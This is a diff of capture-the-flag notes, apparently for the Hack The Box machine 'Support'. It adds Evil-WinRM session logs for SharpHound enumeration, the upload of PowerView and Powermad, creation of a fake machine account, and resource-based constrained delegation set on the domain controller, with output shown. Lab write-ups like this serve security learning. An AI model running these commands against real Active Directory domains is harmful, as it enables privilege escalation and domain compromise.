@@ -142,7 +142,8 @@ Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
 ```
-- tried to log on to each share - only netlogon, support-tools available 
+- tried to log on to each share - only NETLOGON, support-tools, SYSVOL available 
+	- only support-tools available to log into 
 	- pulling down all the files reveals there is a folder and files UserInfo.zip
 		- Within UserInfo.zip there is a UserInfo.exe, UserInfo.exe.config
 		- viewing the UserInfo.exe.config we note that it is running on .NETFramework,Version=v4.8
@@ -379,8 +380,193 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\support\Documents> 
+```
+- navigating to support's Desktop we find the user flag
+```bash
+*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
+814e218..........................
+```
+
+- Run Get-ADDomain for additional information about the domain
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADDomain
+
+
+AllowedDNSSuffixes                 : {}
+ChildDomains                       : {}
+ComputersContainer                 : CN=Computers,DC=support,DC=htb
+DeletedObjectsContainer            : CN=Deleted Objects,DC=support,DC=htb
+DistinguishedName                  : DC=support,DC=htb
+DNSRoot                            : support.htb
+DomainControllersContainer         : OU=Domain Controllers,DC=support,DC=htb
+DomainMode                         : Windows2016Domain
+DomainSID                          : S-1-5-21-1677581083-3380853377-188903654
+ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=support,DC=htb
+Forest                             : support.htb
+InfrastructureMaster               : dc.support.htb
+LastLogonReplicationInterval       :
+LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=support,DC=htb}
+LostAndFoundContainer              : CN=LostAndFound,DC=support,DC=htb
+ManagedBy                          :
+Name                               : support
+NetBIOSName                        : SUPPORT
+ObjectClass                        : domainDNS
+ObjectGUID                         : 553cd9a3-86c4-4d64-9e85-5146a98c868e
+ParentDomain                       :
+PDCEmulator                        : dc.support.htb
+PublicKeyRequiredPasswordRolling   : True
+QuotasContainer                    : CN=NTDS Quotas,DC=support,DC=htb
+ReadOnlyReplicaDirectoryServers    : {}
+ReplicaDirectoryServers            : {dc.support.htb}
+RIDMaster                          : dc.support.htb
+SubordinateReferences              : {DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb}
+SystemsContainer                   : CN=System,DC=support,DC=htb
+UsersContainer                     : CN=Users,DC=support,DC=htb
+```
+- download Sharphound on kali and upload to target machine and run
+```bash 
+*Evil-WinRM* PS C?\Users\support\Documents> upload Sharphound.exe
+
+Info: Uploading /home/kali/tools/bloodhound/SharpHound.exe to C:\Users\support\Documents\SharpHound.exe   
+
+Data: 1712808 bytes of 1712808 bytes copied                                                           
+Info: Upload successful!                                                                                  
+*Evil-WinRM* PS C:\Users\support\Documents> dir                                                       
+    Directory: C:\Users\support\Documents                                                              Mode                 LastWriteTime         Length Name                                                ----                 -------------         ------ ----                                               
+-a----          5/7/2025   4:45 AM        1284608 SharpHound.exe
+
+*Evil-WinRM* PS C:\Users\support\Documents> ./SharpHound.exe                                              
+2025-05-07T04:46:04.4794353-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Rele
+ase of BloodHound
+2025-05-07T04:46:04.6356912-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Tru
+sts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientSe
+rvice, SmbInfo            
+2025-05-07T04:46:04.6825754-07:00|INFORMATION|Initializing SharpHound at 4:46 AM on 5/7/2025
+2025-05-07T04:46:04.7138027-07:00|INFORMATION|Resolved current domain to support.htb
+2025-05-07T04:46:04.8544396-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, R
+DP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
+...
+2025-05-07T04:46:06.0731848-07:00|INFORMATION|Saving cache with stats: 16 ID to type mappings.
+ 0 name to SID mappings.                             
+ 1 machine sid mappings.                             
+ 3 sid to domain mappings.                           
+ 0 global catalog mappings.                          
+2025-05-07T04:46:06.1045080-07:00|INFORMATION|SharpHound Enumeration Completed at 4:46 AM on 5/7/2025! Hap
+py Graphing!
 
 ```
+- download the zip file that was generated 
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> download 20250507044605_BloodHound.zip
+Info: Downloading C:\Users\support\Documents\20250507044605_BloodHound.zip to 20250507044605_BloodHound.zip
+Info: Download successful! 
+```
+- upload to Bloodhound under Administration menu
+![[Pasted image 20250517114233.png]]
+- Explore and search for support@support.htb, select and expand Object Information, expand Outbound Object control.
+	- We see the path from Support to Shared Support Accounts to DC.support.htb
+![[Pasted image 20250517114658.png]]
+- Clicking on 'GenericAll' allows us to look at the Windows abuse info that Bloodhound mentions that due to GenerciAll privilege we can perform a 'Resource Based Constrained Delegation' (RBCD) attack and escalate our privileges. 
+![[Pasted image 20250517120035.png]]
+- Download Powerview on kali and upload to target machine and import https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+```bash
+*Evil-WinRM* PS C?\Users\support\Documents> upload PowerView.ps1
+*Evil-WinRM* PS C?\Users\support\Documents> . ./PowerView.pst
+```
+- Run Get-DomainComputer DC to verify `msds-allowedtoactonbehalfoftotheridentiity` is empty
+	- With the msds value empty, it is susceptible to RBCD attack using Powermad
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity                                                                                           
+name msds-allowedtoactonbehalfofotheridentity                                                             
+---- ----------------------------------------                                                             
+DC        
+```
+- Download Powermad on kali and upload to target machine and import https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1#L303
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> upload Powermad.ps1                                           
+Info: Uploading /home/kali/htb/support/Powermad.ps1 to C:\Users\support\Documents\Powermad.ps1            
+Data: 180768 bytes of 180768 bytes copied                                                                 
+Info: Upload successful!                                                                                  
+*Evil-WinRM* PS C:\Users\support\Documents> . ./Powermad.ps1
+
+```
+- Create a computer object - creates a fake computer and add it to the domain using PowerMad's `New-MachineAccount` module
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)                                                    
+[+] Machine account FAKE-COMP01 added                                                                     
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -identity FAKE-COMP01                          
+DistinguishedName : CN=FAKE-COMP01,CN=Computers,DC=support,DC=htb                                         
+DNSHostName       : FAKE-COMP01.support.htb                                                               
+Enabled           : True                                                                                  
+Name              : FAKE-COMP01                                                                           
+ObjectClass       : computer                                                                              
+ObjectGUID        : d2217ca1-27f8-4eea-8c82-7e86f058c58c                                                  
+SamAccountName    : FAKE-COMP01$                                                                          
+SID               : S-1-5-21-1677581083-3380853377-188903654-5601                                         
+UserPrincipalName :            
+```
+- Configuring RBCD using powerView module to directly set the `msds-allowedtoactonbehalfofotheridentity` attribute
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$                                                                                          
+*Evil-WinRM* PS C:\Users\support\Documents>
+```
+- Confirm the command worked by using the Get-ADComputer commad
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount                                                                                            
+DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb                      
+DNSHostName                          : dc.support.htb                                                     
+Enabled                              : True                                                               
+Name                                 : DC                                                                 
+ObjectClass                          : computer                                                           
+ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127                               
+PrincipalsAllowedToDelegateToAccount : {CN=FAKE-COMP01,CN=Computers,DC=support,DC=htb}                    
+SamAccountName                       : DC$                                                                
+SID                                  : S-1-5-21-1677581083-3380853377-188903654-1000                      
+UserPrincipalName                    :                  
+```
+- Verify the value of `msds`
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select msds-allowedtoactonbehalfofothe
+ridentity                                                                                                 
+msds-allowedtoactonbehalfofotheridentity                                                                  
+----------------------------------------                                                                  
+{1, 0, 4, 128...}     
+```
+- As we can see, the msds-allowedtoactonbehalfofotheridentity now has a value, but because the type of this attribute is Raw Security Descriptor we will have to convert the bytes to a string to understand what's going on.
+	- First, let's grab the desired value and dump it to a variable called RawBytes 
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allo
+wedtoactonbehalfofotheridentity        
+```
+- Then convert these bytes to a Raw Security Descriptor object
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0      
+``` 
+- Print both the entire security `Descriptor` and the `DiscretionaryAcl` class which represents the Access Control LIst that specifies the machines that can act on behalf of the DC
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor                                                               
+ 
+ControlFlags           : DiscretionaryAclPresent, SelfRelative                                            
+Owner                  : S-1-5-32-544                                          
+Group                  :                                                                                  
+SystemAcl              :                                                                                              DiscretionaryAcl       : {System.Security.AccessControl.CommonAce}                                        
+ResourceManagerControl : 0                                                                                
+BinaryLength           : 80                                                                               
+
+*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor.DiscretionaryAcl                                              
+AceQualifier       : AccessAllowed                                                                        
+IsCallback         : False                                                                                            
+OpaqueLength       : 0                                                
+AccessMask         : 983551                                                                               
+SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5601                                                    
+AceType            : AccessAllowed                                                                                    
+AceFlags           : None                                                                                             
+IsInherited        : False                                                                                            InheritanceFlags   : None                                                                                             
+PropagationFlags   : None                                                                                 
+AuditFlags         : None        
+```
+
+
 
 
 - Gobuster to enumerate website if machine has 80 or 443
